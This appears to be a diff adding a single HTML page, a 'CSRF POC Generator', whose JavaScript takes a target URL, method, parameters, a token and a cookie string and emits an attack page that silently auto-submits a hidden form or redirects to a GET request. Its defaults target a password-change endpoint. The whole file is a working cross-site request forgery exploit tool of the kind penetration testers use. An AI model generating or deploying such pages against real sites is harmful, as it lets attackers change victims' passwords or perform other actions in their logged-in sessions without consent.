@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CSRF POC Generator</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 2em;
+    background-color: #f9f9f9;
+  }
+  .container {
+    max-width: 600px;
+    margin: auto;
+    padding: 1em;
+    border-radius: 8px;
+    background: white;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+  h1 {
+    margin-bottom: 0.5em;
+    text-align: center;
+  }
+  label {
+    display: block;
+    margin-top: 1em;
+    font-weight: bold;
+  }
+  input, select, button, textarea {
+    width: 100%;
+    padding: 0.5em;
+    margin-top: 0.3em;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  button {
+    background: #007bff;
+    border: none;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #0056b3;
+  }
+  .output {
+    margin-top: 1em;
+    background: #eef;
+    padding: 1em;
+    white-space: pre-wrap;
+    font-family: monospace;
+    border-radius: 4px;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>CSRF POC Generator</h1>
+    <label for="targetUrl">Target URL</label>
+    <input type="url" id="targetUrl" placeholder="https://example.com/change-password" value="https://example.com/change-password" />
+
+    <label for="method">HTTP Method</label>
+    <select id="method">
+      <option value="POST">POST</option>
+      <option value="GET">GET</option>
+    </select>
+
+    <label for="params">Form Parameters (key=value, one per line)</label>
+    <textarea id="params" rows="6">password=newpass123
+confirm=newpass123</textarea>
+
+    <label for="csrfTokenName">CSRF Token Name</label>
+    <input type="text" id="csrfTokenName" value="csrf_token" />
+
+    <label for="csrfTokenValue">CSRF Token Value</label>
+    <input type="text" id="csrfTokenValue" value="abcdef1234567890" />
+
+    <label for="cookie">Cookie String</label>
+    <textarea id="cookie" rows="2" placeholder="sessionid=abcd1234; path=/;"></textarea>
+
+    <button id="generateBtn">Generate CSRF POC</button>
+
+    <div id="output" class="output"></div>
+  </div>
+
+<script>
+function encodeFormData(data) {
+  return Object.entries(data)
+    .map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v))
+    .join('&');
+}
+
+document.getElementById('generateBtn').addEventListener('click', () => {
+  const url = document.getElementById('targetUrl').value.trim();
+  const method = document.getElementById('method').value;
+  const paramsText = document.getElementById('params').value.trim();
+  const csrfName = document.getElementById('csrfTokenName').value.trim();
+  const csrfValue = document.getElementById('csrfTokenValue').value.trim();
+  const cookieStr = document.getElementById('cookie').value.trim();
+
+  let params = {};
+  if (paramsText) {
+    paramsText.split('\n').forEach(line => {
+      const ix = line.indexOf('=');
+      if (ix > -1) {
+        const key = line.substring(0, ix).trim();
+        const val = line.substring(ix + 1).trim();
+        params[key] = val;
+      }
+    });
+  }
+  // Add CSRF token to params
+  if(csrfName && csrfValue) {
+    params[csrfName] = csrfValue;
+  }
+
+  let html = `<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>CSRF POC Form</title></head>
+<body>
+`;
+
+  if (cookieStr) {
+    html += `<script>
+document.cookie = ${JSON.stringify(cookieStr)};
+<\/script>
+`;
+  }
+
+  if (method === 'POST') {
+    html += `<form id="csrfForm" action="${url}" method="POST" style="display:none;">
+`;
+    for (const [k,v] of Object.entries(params)) {
+      const escapedKey = k.replace(/"/g, '&quot;');
+      const escapedVal = v.replace(/"/g, '&quot;');
+      html += `<input type="hidden" name="${escapedKey}" value="${escapedVal}">
+`;
+    }
+    html += `</form>
+<script>document.getElementById('csrfForm').submit();<\/script>
+`;
+  } else if (method === 'GET') {
+    const queryString = encodeFormData(params);
+    html += `<script>window.location.href = ${JSON.stringify(url + '?' + queryString)};<\/script>
+`;
+  }
+
+  html += `</body>
+</html>`;
+
+  document.getElementById('output').textContent = html;
+});
+</script>
+</body>
+</html>
